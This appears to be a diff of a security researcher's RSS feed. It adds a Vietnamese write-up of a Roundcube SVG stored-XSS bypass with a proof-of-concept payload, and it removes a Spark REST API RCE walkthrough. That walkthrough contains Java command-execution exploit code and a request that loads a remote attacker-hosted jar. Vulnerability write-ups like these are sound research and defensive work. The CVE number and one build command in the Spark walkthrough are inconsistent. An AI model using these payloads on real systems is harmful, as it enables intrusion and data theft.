@@ -140,6 +140,80 @@ Access <strong><code>Receive Shipments</code></strong> to create a new Invoice:<
 ]]></description>
 </item>
 <item>
+    <title>Stored-XSS via animate tag in Roundcube (CVE-2025-68461)</title>
+    <link>https://g03m0n.github.io/posts/cve-2025-68461/</link>
+    <pubDate>Wed, 31 Dec 2025 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2025-68461/</guid>
+    <description><![CDATA[<h1 id="cve-2025-68461-stored-xss-via-animate-tag-in-roundcube">CVE-2025-68461 Stored-XSS via animate tag in Roundcube</h1>
+<h2 id="description-and-impact">Description and Impact</h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version Affected</th>
+<th>Authentication Required</th>
+<th>?-day</th>
+<th>CVSS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Stored-XSS</td>
+<td>&lt;1.5.12, &lt;1.6.12</td>
+<td>Yes</td>
+<td>1-day</td>
+<td>7.2</td>
+</tr>
+</tbody>
+</table>
+<p>Roundcube Webmail before 1.5.12 and 1.6 before 1.6.12 is prone to a Cross-Site-Scripting (XSS) vulnerability via the animate tag in an SVG document.</p>
+<h2 id="root-cause-analysis">Root cause analysis</h2>
+<p><code>program\lib\Roundcube\rcube_washtml.php:dumpHtml()</code></p>
+<p></p>
+<p>Ứng dụng kiểm tra xem thẻ hiện tại (<code>$tagName</code>) có phải là một trong các thẻ hoạt ảnh (<code>animate</code>, <code>animatecolor</code>, …) hay không. Nếu đúng, nó gọi tiếp hàm <code>self::attribute_value</code> để kiểm tra xem thẻ này có chứa thuộc tính tên là <code>attributename</code> và giá trị của nó có đang được đặt là <code>href</code> hay không. Nếu cả 2 điều kiện đúng, nó sẽ chặn thẻ này.</p>
+<p></p>
+<p>Hàm <code>attribute_value</code> đi tìm trong thẻ đó xem có thuộc tính nào khớp tên (<code>$attr_name</code>) và khớp giá trị (<code>$attr_value</code>) hay không. Ở đây là nó <strong>so sánh chuỗi chính xác</strong> (chỉ bỏ qua chữ hoa/chữ thường và khoảng trắng thừa).</p>
+<p>Bypass bằng cách thay href bằng xlink:href:  <code>&lt;animate attributeName=&quot;xlink:href&quot; ...&gt;</code> khi đó:</p>
+<ul>
+<li>Biến <code>$attr_value</code> mà hàm ở Ảnh 1 đang tìm kiếm là chuỗi <strong><code>'href'</code></strong>.</li>
+<li>Nhưng giá trị thực tế truyền vào là chuỗi <strong><code>xlink:href</code></strong>.</li>
+<li>Khi hàm <code>attribute_value()</code>  thực hiện so sánh: <code>'href' === 'xlink:href'</code>, kết quả trả về là <strong>False</strong>.</li>
+</ul>
+<p>→ Ứng dũng sẽ bỏ qua <code>if</code> và không bị block.</p>
+<h3 id="limitation">Limitation</h3>
+<p>Để hiển thị email đồng nhất, ứng dụng bọc nội dung vào một cấu trúc HTML. Điều này ép lớp <code>DOMDocument</code> của PHP phải sử dụng trình phân tích cú pháp HTML (<code>loadHTML()</code>) thay vì XML (<code>loadXML()</code>)</p>
+<p></p>
+<p></p>
+<p></p>
+<p>Trình phân tích HTML không hỗ trợ các tiêu chuẩn của XML namespace. Do đó, trong quá trình xử lý, nó đã âm thầm loại bỏ khai báo bắt buộc <code>xmlns:xlink</code> và tự động chuyển không gian tên của SVG (<code>http://www.w3.org/2000/svg</code>) sang chuẩn HTML (<code>http://www.w3.org/1999/xhtml</code>).</p>
+<p>Từ phiên bản 1.5.8, Roundcube đã thêm CSP header khi người dùng xem ảnh trực tiếp trên trình duyệt:</p>
+<p></p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p>Gửi mail kèm file svg với nội dung như sau:
+<code>xss.svg</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&lt;svg xmlns:xlink<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/1999/xlink&#34;</span>
+</span></span><span style="display:flex;"><span>     xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;a&gt;
+</span></span><span style="display:flex;"><span>    &lt;animate attributeName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;xlink:href&#34;</span> dur<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.1s&#34;</span> fill<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;freeze&#34;</span>
+</span></span><span style="display:flex;"><span>             values<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(1)&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>    &lt;text x<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span> y<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100&#34;</span>
+</span></span><span style="display:flex;"><span>          font-weight<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bold&#34;</span>&gt;Click me!!!&lt;/text&gt;
+</span></span><span style="display:flex;"><span>  &lt;/a&gt;
+</span></span><span style="display:flex;"><span>&lt;/svg&gt;
+</span></span></code></pre></div><p></p>
+<p>Open image in new tab:</p>
+<p></p>
+<p>Click → XSS:</p>
+<p></p>
+<h2 id="patch">Patch</h2>
+<p></p>
+<p>Hàm Regex này sẽ tìm và xóa mọi thứ từ đầu chuỗi cho đến dấu hai chấm <code>:</code>.</p>
+<p>Nếu truyền vào giá trị <code>xlink:href</code> (hoặc bất kỳ tên ảo nào như <code>abc:href</code>), hàm này sẽ cắt bỏ phần đầu, chỉ giữ lại chữ <code>href</code>.</p>
+<p>Khi đó, phép so sánh cuối cùng sẽ là <code>'href' === 'href'</code> (trả về True).</p>
+]]></description>
+</item>
+<item>
     <title>Blind SQL Injection at Rouyi framework ≤ v4.7.9</title>
     <link>https://g03m0n.github.io/posts/cve-2024-42900/</link>
     <pubDate>Tue, 27 Aug 2024 08:29:01 &#43;0800</pubDate>
@@ -976,106 +1050,6 @@ Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ t
 <p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
 <p>![Untitled](Untitled 20.png)</p>
 <p>![Untitled](Untitled 21.png)</p>
-]]></description>
-</item>
-<item>
-    <title>CVE-2020-9480</title>
-    <link>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</link>
-    <pubDate>Tue, 21 Nov 2023 08:29:01 &#43;0800</pubDate>
-    <author>g03m0n</author>
-    <guid>https://g03m0n.github.io/posts/cve-2020-9840/cve-2020-9840/</guid>
-    <description><![CDATA[<h3 id="description">Description</h3>
-<p>Lỗ hổng phát sinh khi tính năng xác thực chính (<code>spark.authenticate</code>) được bật bằng cách sử dụng shared secret. Thông thường, tính năng này yêu cầu người dùng cung cấp <code>shared secret</code> để khởi động tài nguyên của ứng dụng trên Spark <code>cluster</code>. Tuy nhiên, lệnh gọi thủ tục từ xa (RPC) có thể bỏ qua quá trình xác thực và bắt đầu thực thi lệnh thành công, ngay cả khi không có <code>shared secret</code>.
-Kẻ tấn công có thể khai thác lỗ hổng bảo mật này để thực thi từ xa các lệnh shell tùy ý trên máy chủ nơi Spark <code>cluster</code> đang chạy. Bằng cách tận dụng lỗ hổng bảo mật, kẻ tấn công có thể truy cập và kiểm soát trái phép toàn bộ <code>cluster</code>, có khả năng dẫn đến đánh cắp dữ liệu, xâm phạm hệ thống hoặc khai thác mạng thêm.
-Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quyền bị bỏ qua, dẫn đến RCE.</p>
-<h3 id="goal">Goal</h3>
-<p>Khai thác lỗ hổng CVE-2020-9840 thông qua REST API dẫn đến thực thi dòng lệnh từ xa.</p>
-<h3 id="exploitation">Exploitation</h3>
-<p><strong>Bước 1:</strong> Khởi chạy máy ảo Docker bằng câu lệnh <code>docker-compose up</code>:</p>
-<p></p>
-<p>Đây là giao diện chính của Spark Worker:</p>
-<p></p>
-<p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
-<pre tabindex="0"><code>import java.io.BufferedReader;
-import java.io.InputStreamReader;
-
-public class Exploit {
-  public static void main(String[] args) throws Exception {
-    String[] cmds = args[0].split(&#34;,&#34;);
-
-    for (String cmd : cmds) {
-      System.out.println(cmd);
-      System.out.println(executeCommand(cmd.trim()));
-      System.out.println(&#34;==============================================&#34;);
-    }
-  }
-  private static String executeCommand(String command) {
-    StringBuilder output = new StringBuilder();
-
-    try {
-      Process p = Runtime.getRuntime().exec(command);
-      p.waitFor();
-      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));       
-
-      String line;
-      while ((line = reader.readLine()) != null) {
-        output.append(line).append(&#34;\n&#34;);
-      }
-    } catch (Exception e) {
-      e.printStackTrace();
-    }
-
-    return output.toString();
-  }
-}
-</code></pre><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
-<pre tabindex="0"><code>javac .\Exploit.jar
-jar -cvf Exploit.jar Exploit.java
-</code></pre><p></p>
-<p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
-<p></p>
-<p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
-<pre tabindex="0"><code>POST /v1/submissions/create HTTP/1.1
-Host: 192.168.1.39:6066
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-Content-Type: application/json
-Connection: close
-Content-Length: 680
-
-{
-  &#34;action&#34;: &#34;CreateSubmissionRequest&#34;,
-  &#34;clientSparkVersion&#34;: &#34;2.3.1&#34;,
-  &#34;appArgs&#34;: [
-    &#34;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&#34;
-  ],
-  &#34;appResource&#34;: &#34;http://192.168.1.39:8000/Exploit.jar&#34;,
-  &#34;environmentVariables&#34;: {
-    &#34;SPARK_ENV_LOADED&#34;: &#34;1&#34;
-  },
-  &#34;mainClass&#34;: &#34;Exploit&#34;,
-  &#34;sparkProperties&#34;: {
-    &#34;spark.jars&#34;: &#34;http://192.168.1.39:8000/Exploit.jar &#34;,
-    &#34;spark.driver.supervise&#34;: &#34;false&#34;,
-    &#34;spark.app.name&#34;: &#34;Exploit&#34;,
-    &#34;spark.eventLog.enabled&#34;: &#34;true&#34;,
-    &#34;spark.submit.deployMode&#34;: &#34;cluster&#34;,
-    &#34;spark.master&#34;: &#34;spark://192.168.1.39:6066&#34;
-  }
-}
-</code></pre><p>Trong đó, <code>spark.jars</code> là ứng dụng được biên dịch, <code>mainClass</code> là lớp sẽ được chạy và <code>appArgs</code> là các tham số được truyền cho ứng dụng.</p>
-<p></p>
-<p>Bước 5: Có <code>submitId</code> trong gói tin <code>Reponses</code>, ta vào đường dẫn sau để xem kết quả được thực thi:</p>
-<p><code>http://192.168.1.39:8081/logPage/?driverId={submissionId}&amp;logType=stdout</code></p>
-<p></p>
-<p><strong>Video demo</strong></p>
-
-<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
-  <iframe src="https://www.youtube.com/embed/ahpHgVADNf0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
-</div>
-
 ]]></description>
 </item>
 </channel>
